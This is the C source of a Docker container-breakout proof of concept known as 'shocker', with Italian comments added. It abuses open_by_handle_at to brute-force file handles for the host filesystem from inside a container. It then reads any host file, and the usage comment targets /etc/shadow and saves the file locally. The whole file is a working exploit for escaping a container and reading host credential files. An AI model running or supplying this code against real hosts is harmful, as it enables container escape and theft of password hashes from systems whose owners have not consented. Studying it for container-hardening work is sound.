// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// Struttura personalizzata per gestire i file handle
struct my_file_handle {
    unsigned int handle_bytes;
    int handle_type;
    unsigned char f_handle[8];
};

// Funzione per gestire gli errori e terminare il programma
void die(const char *msg) {
    perror(msg);
    exit(errno);
}

// Funzione di debug per stampare i dettagli di un file handle
void dump_handle(const struct my_file_handle *h) {
    fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes, h->handle_type);
    for (int i = 0; i < h->handle_bytes; ++i) {
        fprintf(stderr,"0x%02x", h->f_handle[i]);
        if ((i + 1) % 20 == 0)
            fprintf(stderr,"\n");
        if (i < h->handle_bytes - 1)
            fprintf(stderr,", ");
    }
    fprintf(stderr,"};\n");
}

// Funzione per trovare un file handle per un percorso specificato
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh) {
    int fd;
    uint32_t ino = 0;
    struct my_file_handle outh = {
        .handle_bytes = 8,
        .handle_type = 1
    };
    DIR *dir = NULL;
    struct dirent *de = NULL;
    path = strchr(path, '/');

    // La ricorsione si interrompe se il percorso è stato risolto
    if (!path) {
        memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
        oh->handle_type = 1;
        oh->handle_bytes = 8;
        return 1;
    }

    ++path;
    fprintf(stderr, "[*] Resolving '%s'\n", path);

    // Apre il file handle per il percorso specificato
    if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
        die("[-] open_by_handle_at");

    // Apre la directory e cerca il file nel percorso specificato
    if ((dir = fdopendir(fd)) == NULL)
        die("[-] fdopendir");

    for (;;) {
        de = readdir(dir);
        if (!de)
            break;

        fprintf(stderr, "[*] Found %s\n", de->d_name);

        // Se il nome del file corrisponde, memorizza l'inode e interrompe la ricerca
        if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
            fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
            ino = de->d_ino;
            break;
        }
    }

    fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");

    // Brute force per trovare il rimanente inode a 32 bit
    if (de) {
        for (uint32_t i = 0; i < 0xffffffff; ++i) {
            outh.handle_bytes = 8;
            outh.handle_type = 1;
            memcpy(outh.f_handle, &ino, sizeof(ino));
            memcpy(outh.f_handle + 4, &i, sizeof(i));

            if ((i % (1<<20)) == 0)
                fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);

            // Apre il file handle con il tentativo corrente
            if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
                closedir(dir);
                close(fd);
                dump_handle(&outh);

                // Ricorsivamente cerca ulteriori file handle
                return find_handle(bfd, path, &outh, oh);
            }
        }
    }

    closedir(dir);
    close(fd);
    return 0;
}

int main(int argc, char* argv[]) {
    char buf[0x1000];
    int fd1, fd2;
    struct my_file_handle h;
    struct my_file_handle root_h = {
        .handle_bytes = 8,
        .handle_type = 1,
        .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
    };
    
    // Messaggio di avviso
    fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

    // Attende l'input per avviare l'esecuzione
    read(0, buf, 1);

    // Ottiene un riferimento al filesystem da qualcosa montato da fuori
    if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
        die("[-] open");

    // Cerca il file handle per il percorso specificato
    if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
        die("[-] Cannot find valid handle!");

    // Stampa informazioni di debug sul file handle trovato
    fprintf(stderr, "[!] Got a final handle!\n");
    dump_handle(&h);

    // Apre il file handle ottenuto e legge il suo contenuto in un buffer
    if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
        die("[-] open_by_handle");

    memset(buf, 0, sizeof(buf));

    // Legge il contenuto del file handle
    if (read(fd2, buf, sizeof(buf) - 1) < 0)
        die("[-] read");

    // Stampa un messaggio di successo
    printf("Success!!\n");

    // Scrive il contenuto del file in un nuovo file specificato
    FILE *fptr;
    fptr = fopen(argv[2], "w");
    fprintf(fptr, "%s", buf);
    fclose(fptr);

    // Chiude i file descriptor
    close(fd2);
    close(fd1);

    return 0;
}
